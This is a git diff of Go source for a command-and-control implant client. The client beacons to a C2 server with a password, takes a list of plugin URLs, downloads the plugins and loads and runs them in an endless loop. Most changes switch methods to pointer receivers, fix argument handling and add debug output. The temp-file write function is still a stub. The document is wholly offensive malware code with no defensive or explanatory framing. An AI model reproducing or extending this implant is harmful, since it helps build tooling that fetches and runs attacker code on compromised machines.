@@ -9,6 +9,7 @@ import (
 	"net/url"
 	"os"
 	"plugin"
+	"strconv"
 )
 
 var PrintDebugMessages bool
@@ -45,7 +46,7 @@ func CheckError(err error) {
 	}
 }
 
-func (implantClient ImplantClient) DownloadPlugins() error {
+func (implantClient *ImplantClient) DownloadPlugins() error {
 	for idx, pluginToDownload := range implantClient.PluginsToRun {
 		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
 		res, err := http.PostForm(pluginToDownload.PluginUrl, url.Values{
@@ -64,11 +65,11 @@ func (implantClient ImplantClient) DownloadPlugins() error {
 	return nil
 }
 
-func (implantClient ImplantClient) WritePluginToTempDir(base64Plugin string) (string, error) {
+func (implantClient *ImplantClient) WritePluginToTempDir(base64Plugin string) (string, error) {
 	return "", nil
 }
 
-func (implantClient ImplantClient) ExecutePlugins() error {
+func (implantClient *ImplantClient) ExecutePlugins() error {
 	for idx, pluginToRun := range implantClient.PluginsToRun {
 		plugin, err := plugin.Open(pluginToRun.PluginFile)
 		if err != nil {
@@ -96,39 +97,48 @@ func (implantClient ImplantClient) ExecutePlugins() error {
 	return nil
 }
 
-func (implantClient ImplantClient) HeartBeat() error {
+func (implantClient *ImplantClient) HeartBeat() error {
 	//Call C2 server get json list of plugins
 	res, err := http.PostForm(implantClient.Url, url.Values{
 		"client_password": {implantClient.C2Pass}})
+	CheckError(err)
 	//Update Plugin list
 	defer res.Body.Close()
 	body, err := ioutil.ReadAll(res.Body)
 	CheckError(err)
 	var data PluginsFromC2
-	json.Unmarshal([]byte(body), &data)
+	json.Unmarshal(body, &data)
+	DebugPrinter("GOT " + string(body))
 	for _, pluginFromC2 := range data {
-		pluginToAdd := &ImplantPlugin{
+		pluginToAdd := ImplantPlugin{
 			PluginId:   pluginFromC2.PluginID,
 			PluginName: pluginFromC2.PluginName,
 			PluginUrl:  pluginFromC2.PluginURL,
 		}
-		implantClient.PluginsToRun = append(implantClient.PluginsToRun, *pluginToAdd)
+		DebugPrinter("PLUGIN " + pluginToAdd.PluginUrl)
+		DebugPrinter("LEN BEFORE: " + strconv.Itoa(len(implantClient.PluginsToRun)))
+		implantClient.PluginsToRun = append(implantClient.PluginsToRun, pluginToAdd)
 	}
+	DebugPrinter("LEN BEFORE: " + strconv.Itoa(len(implantClient.PluginsToRun)))
+	DebugPrinter(implantClient.PluginsToRun[0].PluginUrl)
 	//Decode body and add to plugin list
 	return nil
 }
 
-func (implantClient ImplantClient) Loop() error {
+func (implantClient *ImplantClient) Loop() error {
+	DebugPrinter("Sending heartbeat")
 	err := implantClient.HeartBeat()
 	if err != nil {
 		return err
 	}
 	//Download plugins
+	DebugPrinter("Downloading plugins")
 	err = implantClient.DownloadPlugins()
 	if err != nil {
 		return err
 	}
 	//Execute plugins
+	DebugPrinter("Executing plugins")
 	err = implantClient.ExecutePlugins()
 	if err != nil {
 		return err
@@ -136,7 +146,7 @@ func (implantClient ImplantClient) Loop() error {
 	return nil
 }
 
-func (implantClient ImplantClient) ClearPluginList() error {
+func (implantClient *ImplantClient) ClearPluginList() error {
 	implantClient.PluginsToRun = nil
 	return nil
 }
@@ -149,18 +159,18 @@ func main() {
 	}
 
 	host := os.Args[1]
-	c2_pass := os.Args[3]
+	c2_pass := os.Args[2]
 
 	fmt.Println("Connecting to " + host)
 
-	implant := &ImplantClient{
+	implant := ImplantClient{
 		Url:          host,
 		C2Pass:       c2_pass,
-		PluginsToRun: make([]ImplantPlugin, 10),
+		PluginsToRun: make([]ImplantPlugin, 0),
 	}
 
 	for {
-		err = implant.Loop()
+		err := implant.Loop()
 		CheckError(err)
 	}
 }
